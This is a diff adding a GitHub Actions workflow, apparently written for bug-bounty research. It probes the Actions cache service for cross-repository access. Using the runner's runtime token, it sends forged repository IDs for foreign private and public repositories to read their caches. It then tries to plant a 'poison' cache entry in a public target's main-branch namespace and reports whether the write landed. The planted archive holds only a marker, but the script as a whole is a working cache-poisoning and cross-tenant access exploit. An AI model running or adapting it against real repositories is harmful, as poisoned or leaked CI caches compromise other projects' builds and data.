@@ -1,0 +1,338 @@
+name: GHBB public cache repository ID oracle
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  issues: write
+  pull-requests: write
+
+jobs:
+  oracle:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    env:
+      CURRENT_REPOSITORY_ID: '1152881403'
+      PRIVATE_TARGET_REPOSITORY_ID: '1313057222'
+      PUBLIC_TARGET_REPOSITORY_ID: '948177035'
+      ORACLE_VERSION: c0b3e6583b9a1be2c42be8d16cd3df4d330fc7a9f5475856192b57d167de48d0
+      POISON_VERSION: 6d5198f4084f977939baf91ab0376c0c538b8eac58448b4e6e31aed50ae2f04b
+    steps:
+      - name: Create controlled cache archives
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p oracle-cache poison-cache
+          printf 'GHBB-CACHE-REPOID-ORACLE-%s\n' "$GITHUB_RUN_ID" > oracle-cache/marker.txt
+          printf 'GHBB-CACHE-REPOID-POISON-%s\n' "$GITHUB_RUN_ID" > poison-cache/marker.txt
+          tar --posix --use-compress-program zstdmt -cf poison.tzst -C "$GITHUB_WORKSPACE" poison-cache
+          sha256sum poison.tzst
+
+      - name: Save current-repository positive control
+        id: save
+        continue-on-error: true
+        uses: actions/cache/save@v4
+        with:
+          path: oracle-cache
+          key: ghbb-public-repoid-oracle-${{ github.run_id }}
+
+      - name: Test repository ID handling on lookup and write
+        if: always()
+        uses: actions/github-script@v7
+        env:
+          SAVE_OUTCOME: ${{ steps.save.outcome }}
+          ORACLE_KEY: ghbb-public-repoid-oracle-${{ github.run_id }}
+          POISON_KEY: ghbb-public-repoid-poison-${{ github.run_id }}
+        with:
+          script: |
+            const fs = require('fs')
+            const path = require('path')
+            const crypto = require('crypto')
+            const {spawnSync} = require('child_process')
+
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || ''
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL || ''
+            const currentRepositoryId = process.env.CURRENT_REPOSITORY_ID
+            const privateTargetRepositoryId = process.env.PRIVATE_TARGET_REPOSITORY_ID
+            const publicTargetRepositoryId = process.env.PUBLIC_TARGET_REPOSITORY_ID
+            const currentScope = process.env.GITHUB_REF || 'refs/pull/2/merge'
+            const oracleKey = process.env.ORACLE_KEY
+            const oracleVersion = process.env.ORACLE_VERSION
+            const oracleMarker = `GHBB-CACHE-REPOID-ORACLE-${context.runId}`
+            const poisonKey = process.env.POISON_KEY
+            const poisonVersion = process.env.POISON_VERSION
+            const poisonMarker = `GHBB-CACHE-REPOID-POISON-${context.runId}`
+            const poisonArchive = fs.readFileSync('poison.tzst')
+
+            const state = {
+              save_outcome: process.env.SAVE_OUTCOME || '<unset>',
+              runtime_context_valid: Boolean(token && resultsUrl),
+              lookup_baseline_valid: false,
+              lookup_current_metadata_valid: false,
+              foreign_repository_id_ignored: false,
+              foreign_repository_id_honored: false,
+              repository_id_behavior: '<undetermined>',
+              create_http: 0,
+              create_ok: false,
+              create_signed_url: false,
+              upload_http: 0,
+              finalize_http: 0,
+              finalize_ok: false,
+              finalize_entry_id: false,
+              write_landed_current_namespace: false,
+              write_landed_target_namespace_candidate: false,
+              harness_valid: false,
+              failure: '<none>'
+            }
+            const cases = []
+            const base = resultsUrl ? (resultsUrl.endsWith('/') ? resultsUrl : `${resultsUrl}/`) : ''
+            const service = `${base}twirp/github.actions.results.api.v1.CacheService`
+
+            async function twirp(method, body) {
+              try {
+                const response = await fetch(`${service}/${method}`, {
+                  method: 'POST',
+                  headers: {
+                    authorization: `Bearer ${token}`,
+                    'content-type': 'application/json'
+                  },
+                  body: JSON.stringify(body),
+                  signal: AbortSignal.timeout(20000)
+                })
+                const text = await response.text()
+                let json = null
+                try { json = text ? JSON.parse(text) : {} } catch (_) {}
+                return {status: response.status, json}
+              } catch (_) {
+                return {status: 0, json: null}
+              }
+            }
+
+            async function transfer(url, method, bytes = undefined) {
+              if (!url) return {status: 0, bytes: Buffer.alloc(0)}
+              core.setSecret(url)
+              try {
+                const options = {method, signal: AbortSignal.timeout(20000)}
+                if (method === 'PUT') {
+                  options.headers = {
+                    'x-ms-blob-type': 'BlockBlob',
+                    'x-ms-version': '2021-12-02',
+                    'content-type': 'application/octet-stream'
+                  }
+                  options.body = bytes
+                }
+                const response = await fetch(url, options)
+                const returned = method === 'GET' && response.status === 200
+                  ? Buffer.from(await response.arrayBuffer())
+                  : Buffer.alloc(0)
+                return {status: response.status, bytes: returned}
+              } catch (_) {
+                return {status: 0, bytes: Buffer.alloc(0)}
+              }
+            }
+
+            function inspectArchive(label, bytes, expectedMarker) {
+              const result = {archive_valid: false, extract_exit: -1, exact_marker: false}
+              if (!bytes.length) return result
+              const safe = label.replace(/[^a-zA-Z0-9_.-]/g, '_')
+              const archive = `${safe}.tzst`
+              const directory = `${safe}-extract`
+              fs.writeFileSync(archive, bytes, {mode: 0o600})
+              fs.rmSync(directory, {recursive: true, force: true})
+              fs.mkdirSync(directory, {recursive: true, mode: 0o700})
+              let extracted = spawnSync('tar', ['--use-compress-program', 'unzstd', '-xf', archive, '-C', directory], {
+                timeout: 20000,
+                encoding: 'utf8'
+              })
+              if (extracted.status !== 0) {
+                extracted = spawnSync('bash', ['-lc', `zstd -d -q --stdout ${archive} | tar -xf - -C ${directory}`], {
+                  timeout: 20000,
+                  encoding: 'utf8'
+                })
+              }
+              result.extract_exit = extracted.status === null ? -1 : extracted.status
+              result.archive_valid = extracted.status === 0
+              if (!result.archive_valid) return result
+              const pending = [directory]
+              let files = 0
+              while (pending.length && files < 1000) {
+                const current = pending.pop()
+                let entries = []
+                try { entries = fs.readdirSync(current, {withFileTypes: true}) } catch (_) { continue }
+                for (const entry of entries) {
+                  const full = path.join(current, entry.name)
+                  if (entry.isDirectory()) pending.push(full)
+                  else if (entry.isFile()) {
+                    files += 1
+                    try {
+                      if (fs.statSync(full).size <= 1024 * 1024 && fs.readFileSync(full, 'utf8').trim() === expectedMarker) {
+                        result.exact_marker = true
+                        return result
+                      }
+                    } catch (_) {}
+                  }
+                }
+              }
+              return result
+            }
+
+            async function lookupCase({name, key, version, metadata, marker}) {
+              const request = {key, restore_keys: [], version}
+              if (metadata !== undefined) request.metadata = metadata
+              const response = await twirp('GetCacheEntryDownloadURL', request)
+              const url = response.json?.signed_download_url || response.json?.signedDownloadUrl || ''
+              const downloaded = await transfer(url, 'GET')
+              const inspected = inspectArchive(name, downloaded.bytes, marker)
+              const record = {
+                name,
+                http: response.status,
+                ok: response.json?.ok === true,
+                signed_url: Boolean(url),
+                matched_key: response.json?.matched_key || response.json?.matchedKey || '<none>',
+                download_http: downloaded.status,
+                bytes: downloaded.bytes.length,
+                sha256: downloaded.bytes.length
+                  ? crypto.createHash('sha256').update(downloaded.bytes).digest('hex')
+                  : '<none>',
+                archive_valid: inspected.archive_valid,
+                extract_exit: inspected.extract_exit,
+                exact_marker: inspected.exact_marker
+              }
+              cases.push(record)
+              return record
+            }
+
+            try {
+              if (!state.runtime_context_valid) throw new Error('runtime_context')
+
+              const baseline = await lookupCase({
+                name: 'oracle_baseline',
+                key: oracleKey,
+                version: oracleVersion,
+                marker: oracleMarker
+              })
+              state.lookup_baseline_valid = baseline.exact_marker
+
+              const currentMetadata = await lookupCase({
+                name: 'oracle_current_repository_id',
+                key: oracleKey,
+                version: oracleVersion,
+                metadata: {repository_id: currentRepositoryId, scope: [{scope: currentScope, permission: '1'}]},
+                marker: oracleMarker
+              })
+              state.lookup_current_metadata_valid = currentMetadata.exact_marker
+
+              const privateTarget = await lookupCase({
+                name: 'oracle_private_target_repository_id',
+                key: oracleKey,
+                version: oracleVersion,
+                metadata: {repository_id: privateTargetRepositoryId, scope: [{scope: 'refs/pull/1/merge', permission: '1'}]},
+                marker: oracleMarker
+              })
+
+              const publicTarget = await lookupCase({
+                name: 'oracle_public_target_repository_id',
+                key: oracleKey,
+                version: oracleVersion,
+                metadata: {repository_id: publicTargetRepositoryId, scope: [{scope: 'refs/heads/main', permission: '1'}]},
+                marker: oracleMarker
+              })
+
+              const bogusTarget = await lookupCase({
+                name: 'oracle_bogus_repository_id',
+                key: oracleKey,
+                version: oracleVersion,
+                metadata: {repository_id: '999999999999999999', scope: [{scope: currentScope, permission: '1'}]},
+                marker: oracleMarker
+              })
+
+              state.foreign_repository_id_ignored = privateTarget.exact_marker && publicTarget.exact_marker && bogusTarget.exact_marker
+              state.foreign_repository_id_honored = !privateTarget.signed_url && !publicTarget.signed_url && !bogusTarget.signed_url
+              if (state.foreign_repository_id_ignored) state.repository_id_behavior = 'ignored_token_derived'
+              else if (state.foreign_repository_id_honored) state.repository_id_behavior = 'honored_or_rejected'
+              else state.repository_id_behavior = 'mixed'
+
+              const targetMetadata = {
+                repository_id: publicTargetRepositoryId,
+                scope: [{scope: 'refs/heads/main', permission: '3'}]
+              }
+              const created = await twirp('CreateCacheEntry', {
+                metadata: targetMetadata,
+                key: poisonKey,
+                version: poisonVersion
+              })
+              state.create_http = created.status
+              state.create_ok = created.json?.ok === true
+              const uploadUrl = created.json?.signed_upload_url || created.json?.signedUploadUrl || ''
+              state.create_signed_url = Boolean(uploadUrl)
+              const uploaded = await transfer(uploadUrl, 'PUT', poisonArchive)
+              state.upload_http = uploaded.status
+
+              const finalized = await twirp('FinalizeCacheEntryUpload', {
+                metadata: targetMetadata,
+                key: poisonKey,
+                size_bytes: String(poisonArchive.length),
+                version: poisonVersion
+              })
+              state.finalize_http = finalized.status
+              state.finalize_ok = finalized.json?.ok === true
+              const entryId = finalized.json?.entry_id || finalized.json?.entryId || '0'
+              state.finalize_entry_id = String(entryId) !== '0' && String(entryId) !== ''
+
+              const poisonBaseline = await lookupCase({
+                name: 'poison_lookup_baseline',
+                key: poisonKey,
+                version: poisonVersion,
+                marker: poisonMarker
+              })
+              const poisonCurrent = await lookupCase({
+                name: 'poison_lookup_current_repository_id',
+                key: poisonKey,
+                version: poisonVersion,
+                metadata: {repository_id: currentRepositoryId, scope: [{scope: currentScope, permission: '1'}]},
+                marker: poisonMarker
+              })
+              const poisonTarget = await lookupCase({
+                name: 'poison_lookup_public_target_repository_id',
+                key: poisonKey,
+                version: poisonVersion,
+                metadata: {repository_id: publicTargetRepositoryId, scope: [{scope: 'refs/heads/main', permission: '1'}]},
+                marker: poisonMarker
+              })
+
+              state.write_landed_current_namespace = poisonBaseline.exact_marker && poisonCurrent.exact_marker
+              state.write_landed_target_namespace_candidate = poisonTarget.exact_marker && !poisonBaseline.exact_marker && !poisonCurrent.exact_marker
+              state.harness_valid = state.lookup_baseline_valid && state.lookup_current_metadata_valid
+            } catch (error) {
+              state.failure = String(error?.message || 'other').replace(/[^a-zA-Z0-9_.-]/g, '_').slice(0, 80)
+            }
+
+            for (const [name, value] of Object.entries(state)) console.log(`${name}=${value}`)
+            for (const item of cases) console.log(`${item.name}=${JSON.stringify(item)}`)
+
+            const caseLines = cases.map(item =>
+              `- ${item.name}: \`http=${item.http}, ok=${item.ok}, signed=${item.signed_url}, matched=${item.matched_key}, download=${item.download_http}, bytes=${item.bytes}, archive=${item.archive_valid}, extract=${item.extract_exit}, exact=${item.exact_marker}, sha256=${item.sha256}\``
+            )
+            const body = [
+              '<!-- ghbb-public-cache-repoid-oracle-result -->',
+              `GHBB public cache repository-ID oracle for run ${context.runId}:`,
+              ...Object.entries(state).map(([name, value]) => `- ${name}: \`${value}\``),
+              ...caseLines,
+              '- runtime_token_signed_url_or_content_exposed: `false`'
+            ].join('\n')
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: context.payload.pull_request.number,
+              body
+            })
+
+            if (!state.harness_valid) {
+              core.setFailed(`Repository-ID oracle harness invalid: ${state.failure}`)
+            } else if (state.write_landed_target_namespace_candidate) {
+              core.setFailed('POTENTIAL_CROSS_REPOSITORY_CACHE_WRITE_VIA_CLIENT_REPOSITORY_ID')
+            } else {
+              console.log(`RESULT=REPOSITORY_ID_${state.repository_id_behavior}`)
+            }
